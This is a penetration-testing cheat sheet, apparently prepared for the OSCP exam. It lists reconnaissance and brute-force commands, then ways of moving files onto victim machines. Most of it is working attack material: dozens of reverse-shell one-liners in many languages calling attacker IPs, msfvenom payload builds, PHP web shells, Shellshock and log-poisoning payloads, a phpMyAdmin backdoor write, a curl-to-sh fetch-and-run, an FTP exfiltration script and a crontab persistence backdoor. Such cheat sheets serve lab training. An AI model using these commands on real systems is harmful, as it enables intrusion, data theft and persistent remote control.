# cheatsheet

# Reconnaissance

## Autorecon

### Autorecon

[https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)

```
autorecon -vv 192.168.0.1

```

## Enum4Linux

Enum4Linux

Scan Host

```
enum4linux 192.168.0.1

```

Scan Host, Suppress Errors

```
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out

```

## Gobuster

GobusterTOC/Outline

HTTP

Fast Scan (Small List)

```
gobuster dir -e -u <http://192.168.0.1> -w /usr/share/wordlists/dirb/big.txt -t 20

```

Fast Scan (Big List)

```
gobuster dir -e -u <http://192.168.0.1> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

```

Slow Scan (Check File Extensions)

```
gobuster dir -e -u <http://192.168.0.1> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20

```

HTTPS

Set the --insecuressl flag.

## NFS

NFS

Show mountable drives

```
showmount -e 192.168.0.1

```

Mount Drive

```
mkdir mpt

```

```
mount -t nfs -o soft 192.168.0.1:/backup mpt/

```

## Nmap

Nmap

Initial Fast TCP Scan

```
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1

```

Full TCP Scan

```
nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1

```

Limited Full TCP Scan
If the syn scan is taking very long to complete, the following command is an alternative (no service detection).

```
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1

```

Top 100 UDP Scan

```
nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1

```

Full Vulnerability scan

```
nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1

```

Vulners Vulnerability Script

```
nmap -v -sS  -Pn --script nmap-vulners -oA full_vuln_scan_192.168.0.1 192.168.0.1

```

SMB Vulnerabitlity Scan

```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.0.1 192.168.0.1

```

## SMBCLIENT

SMBCLIENT

Fix Kali Default Installation
To fix NT_STATUS_CONNECTION_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \etc\samba\smb.conf file.

List Shares (As Guest)

```
smbclient -U guest -L 192.168.0.1

```

Connect to A Share (As User John)

```
smbclient \\\\\\\\192.168.0.1\\\\Users -U c.smith

```

Download All Files From A Directory Recursively

```
smbclient '\\\\server\\share' -N -c 'prompt OFF;recurse ON;cd 'path\\to\\directory\\';lcd '~/path/to/download/to/';mget *'

```

example:

```
smbclient \\\\\\\\192.168.0.1\\\\Data -U John -c 'prompt OFF;recurse ON;cd '\\Users\\John\\';lcd '/tmp/John';mget *'

```

Alternate File Streams

List Streams

```
smbclient \\\\\\\\192.168.0.1\\\\Data -U John -c 'allinfo "\\Users\\John\\file.txt"'

```

Download Stream By Name (:SECRET)

```
get "\\Users\\John\\file.txt:SECRET:$DATA"

```

## SQLMAP

SQLMAP

DISCLAIMER:
There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them.
Check which tools are restricted/banned before you use them in your exam. You can find detailed information about tool usage in the official exam guideline.

Get Request

Test All (Default Settings)

```
sqlmap -u "<http://192.168.0.1/database/inject.php?q=user>" --batch

```

Test All (Default Settings, High Stress)

```
sqlmap -u "<http://192.168.0.1/database/inject.php?q=user>" --batch --level=5 --risk=3

```

Post Request (Capture with BURP)

Test All (Default Settings)

```
sqlmap --all -r post_request.txt --batch

```

Test All (Default Settings, High Stress)

```
sqlmap --all -r post_request.txt --batch --level=5 --risk=3

```

Get A Reverse Shell (MySQL)

```
sqlmap -r post_request.txt --dbms "mysql" --os-shell

```

## WebApp Paths

WebApp Paths
[https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md](https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md)

# helpful link

## 提权

[https://gtfobins.github.io](https://gtfobins.github.io/)[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

常用命令：

```
find / -perm -u=s -type f 2>/dev/null

```

```
getcap -r / 2>/dev/null

```

linPEAS command:

```
curl <https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh> | sh

```

```
wget <https://highon.coffee/downloads/linux-local-enum.sh> -O a.sh

```

tips大全网站：
[https://book.hacktricks.xyz](https://book.hacktricks.xyz/)

提权 checklist：
[https://jok3rsecurity.wordpress.com/linux-privilege-escalation/](https://jok3rsecurity.wordpress.com/linux-privilege-escalation/)

# File Transfer

## Powershell

Powershell

As Cmd.exe Command

```
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('<http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\\Users\\john\\Desktop\\juicy.exe>')

```

Encode Command for Transfer
Very helpful for chars that need to be escaped otherwise.

```
$Command = '(new-object System.Net.WebClient).DownloadFile("<http://192.168.0.1:80/ftp.txt","C:\\Windows\\temp\\ftp.txt>")'
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
powershell.exe -NoProfile -encoded $Encoded

```

## Certutil

Certutil

Download

```
certutil.exe -urlcache -f <http://192.168.0.1/shell.exe> C:\\Windows\\Temp\\shell.exe

```

Download & Execute Python Command

```
os.execute('cmd.exe /c certutil.exe -urlcache -split -f <http://192.168.0.1/shell.exe> C:\\Windows\\Temp\\shell.exe & C:\\Windows\\Temp\\shell.exe')

```

## SMB

SMB

Start Impacket SMB Server (With SMB2 Support)

```
impacket-smbserver -smb2support server_name /var/www/html

```

List Drives (Execute on Victim)

```
net view \\\\192.168.0.1

```

Copy Files (Execute on Victim)

```
copy \\\\192.168.0.1\\server_name\\shell.exe shell.exe

```

## PureFTP

PureFTP

Install

```
apt-get update && apt-get install pure-ftpd

```

Create [setupftp.sh](http://setupftp.sh/) Execute The Script

```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh

```

Get Service Ready

Reset Password

```
pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd

```

Commit Changes

```
pure-pw mkdb

```

Restart Service

```
/etc/init.d/pure-ftpd restart

```

Create FTP Script (On Victim)

```
echo open 192.168.0.1>> ftp.txt
echo USER myftpuser>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo put secret_data.txt>> ftp.txt
echo bye >> ftp.txt

```

Exectue Script (On Victim)

```
ftp -v -n -s:ftp.txt

```

## Netcat

Netcat

Receiving Shell

```
nc -l -p 1234 > out.file

```

Sending Shell

```
nc -w 3 192.168.0.1 1234 < out.file

```

## TFTP

TFTP

```
Start TFTP Daemon (Folder /var/tftp)
atftpd --daemon --port 69 /var/tftp

```

Transfer Files

```
tftp -i 192.168.0.1 GET whoami.exe

```

## VBScript

VBScript

Create wget.vbs File

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

```

Download Files

```
cscript wget.vbs <http://192.168.0.1/nc.exe> nc.exe

```

# Brute Force

## Hydra

Hydra

HTTP Basic Authentication

```
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15

```

HTTP Get Request

```
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15

```

HTTP Post Request
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15

```

MYSQL
Change MYDATABASENAME. Default databasename is mysql.

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv mysql://192.168.0.1:3306/MYDATABASENAME -t 15

```

# Reverse Shell

## FULL TTY

```bash
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```



## Bash

```
bash -i >& /dev/tcp/10.10.14.6/7777 0>&1

bash -c "bash -i >& /dev/tcp/10.10.14.6/7777 0>&1"

```

## Netcat

```
nc -e /bin/sh 192.168.1.2 443

nc -e /bin/bash 192.168.1.2 443

nc -c /bin/sh 192.168.1.2 443

nc -c /bin/bash 10.10.14.6 7777

nc.exe -e cmd 192.168.1.26 443

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f

```

### PHP Web Shell

```
<?php echo system($_GET['cmd']); ?>

```

---

`Web Shell (SSH Log Poisoning)` /var/log/auth.log

```
ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2

```

`Web Shell (HTTP Log Poisoning)` /var/log/apache2/access.log

```
curl -s -H "User-Agent: <?php system(\\$_GET['cmd']); ?>" "<http://192.168.1.2>"

```

```
User-Agent: <?php system($_GET['cmd']); ?>

```

---

`Shellshock (SSH)`

```
root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'

```

`Shellshock (HTTP)`

```
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.sh>"

curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.cgi>"

```

`Shellshock (HTTP) [FIX -> 500 Internal Server Error]`

```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.sh>"

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.sh>"

curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.cgi>"

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "<http://192.168.1.3/cgi-bin/evil.cgi>"

```

---

`Wordpress`

```
root@kali:~# nano reverse.php

```

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
?>

```

```
root@kali:~# zip reverse.zip reverse.php

```

- Plugins
- Add New
- Upload Plugin
- Install Now
- Activate Plugin

---

## Perl

```
perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

---

## Python

```
 export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```

---

## PHP`

```
php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("192.168.1.2",443);system("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("192.168.1.2",443);passthru("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("192.168.1.2",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

php -r '$sock=fsockopen("192.168.1.2",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

```

---

## Ruby

```
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

---

## Xterm

```
xterm -display 192.168.1.2:443

```

---

## Ncat

```
ncat 192.168.1.2 443 -e /bin/bash

```

---

## Powershell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('<http://192.168.1.2:8000/reverse.ps1>')

```

---

## Awk

```
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

```

---

## Gawk

```
gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'

```

---

## Golang

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

```

---

## Telnet

```
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p

```

```
telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443

```

---

## Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

---

## Node

```
require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');

```

---

## October CMS

```
function onstart(){
  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
  }

```

---

## Groovy (Jenkins)

```
String host="192.168.1.2";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

---

## Msfvenom

### Php

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php

```

```
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php

```

### War

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war

```

### Jar

```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f jar > reverse.jar

```

### JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.jsp

```

### Aspx

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx

```

### Windows

`Meterpreter (Metasploit Listener multi/handler) [Staged]`

`x86`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`x64`

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`Shell (Metasploit Listener multi/handler) [Staged]`

`x86`

```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`x64`

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`Shell (Netcat Listener) [Stageless]`

`x86`

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`x64`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe

```

`Linux`

`Meterpreter (Metasploit Listener multi/handler) [Staged]`

`x86`

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf

```

`x64`

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf

```

`Shell (Metasploit Listener multi/handler) [Staged]`

`x86`

```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf

```

`x64`

```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf

```

`Shell (Netcat Listener) [Stageless]`

`x86`

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf

```

`x64`

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elF

```

---

## Upgrade Shell (TTY)

Upgrade Shell (TTY)

```
python3 -c 'import pty;pty.spawn("/bin/bash");'
python -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm-256color

```

Shell Spawning

```
python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

```

```
/bin/sh -i

```

```
perl —e 'exec "/bin/sh";'

```

perl:
exec "/bin/sh";

ruby:
exec "/bin/sh"

lua:
os.execute('/bin/sh')

(From within IRB)
exec "/bin/sh"

(From within vi)
:!bash

(From within vi)
:set shell=/bin/bash:shell

(From within nmap)
!sh

## Enable Tab-Completion

Enable Tab-Completion

1. In your active shell press bg to send your nc session to background
2. Enter stty raw -echo
3. Enter fg to bring your nc session to foreground
4. Enter export TERM=xterm-256color

## Catching Reverse Shells (Nc)

Catching Reverse Shells (Netcat)

rlwrap enables the usage of arrow keys in your shell. [https://github.com/hanslub42/rlwrap](https://github.com/hanslub42/rlwrap)

```
rlwrap nc -nlvp 4444

```

## Netcat

### Reverse Shell

Reverse Shell

Unix

```
nc 192.168.0.1 4444 -e /bin/bash

```

If -e is not allowed, try to find other versions of netcat

```
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc.traditional

```

Windows

```
nc 192.168.0.1 4444 -e cmd.exe

```

### Bind Shell

Bind shell

Unix

Victim:

```
nc -nlvp 4444 -e /bin/bash

```

Attacker:

```
nc 192.168.0.1 4444

```

Windows

Victim:

```
nc -nlvp 4444 -e cmd.exe

```

Attacker:

```
nc 192.168.0.1 4444

```

## Bash

Bash

Reverse Shell

```
/bin/bash -i >& /dev/tcp/10.10.14.5/8888 0>&
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.23/5555 0>&1"

```

[https://sentrywhale.com/documentation/reverse-shell](https://sentrywhale.com/documentation/reverse-shell) for openbsd and so on

## Python

Python

Reverse Shell

As Command:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.121",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

Python Code:

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```

## PHP

PHP

### Kali Default PHP Reverse Shell

Kali Default PHP Reverse Shell

```
cat /usr/share/webshells/php/php-reverse-shell.php

```

### Kali Default PHP CMD Shell

Kali Default PHP CMD Shell

```
cat /usr/share/webshells/php/php-backdoor.php

```

### CMD Shell

CMD Shell

```
<?php echo system($_REQUEST["cmd"]); ?>

```

Call the CMD shell:
[http://192.168.0.1/cmd_shell.php?cmd=whoami](http://192.168.0.1/cmd_shell.php?cmd=whoami)

### White WinterWolf Webshell

WhiteWinterWolf Webshell

[https://github.com/WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### PHP Reverse Shell

PHP Reverse Shell

Version 1

```
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>

```

Version 2

```
<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2 >& 3");?>

```

As Command

```
php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```

## MSFVENOM

### Windows Binary (.exe)

Windows Binary (.exe)

32 Bit (x86)

Reverse Shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

```

Bind Shell:

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

```

Output in Hex, C Style, Exclude bad chars, Exitfunction thread:

```
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f c -a x86 --platform windows

```

64 Bit (x64)

Reverse Shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

```

Bind Shell:

```
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

```

Meterpreter:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

```

### Linux Binary (.elf)

Linux Binary (.elf)

32 Bit (x86)

Reverse Shell:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

```

Bind Shell:

```
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf

```

64 Bit (x64)

Reverse Shell:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

```

Bind Shell:

```
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf

```

### Java Server Pages (.jsp)

Java Server Pages (.jsp)

Reverse Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp

```

### Active Sever Pages Extended (.aspx)

Active Sever Pages Extended (aspx)

Reverse Shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx

```

## Active Sever Pages Extended (.apsx)

Active Sever Pages Extended (.aspx)

Transfer A File (Certutil)

```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f <http://192.168.0.1/shell.exe> C:\\Windows\\Temp\\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>

```

Execute a File

```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\\Windows\\Temp\\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>

```

## Jenkins / Groovy (Java)

Jenkins / Groovy (Java)

Linux Reverse Shell

```
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

Windows Reverse Shell

```
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

## Perl

Perl

Reverse Shell

```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

## PhpmyAdmin

PhpmyAdmin

Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)

Windows

SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"

Unix

SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"

## Proof

*Linux*

```bash
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

*Windows*

```bash
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```



## Persistence

*Crontab*

```bash
(crontab -l ; echo "*/3 * * * *  	/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6002 0>&1'")|crontab 2> /dev/null
```

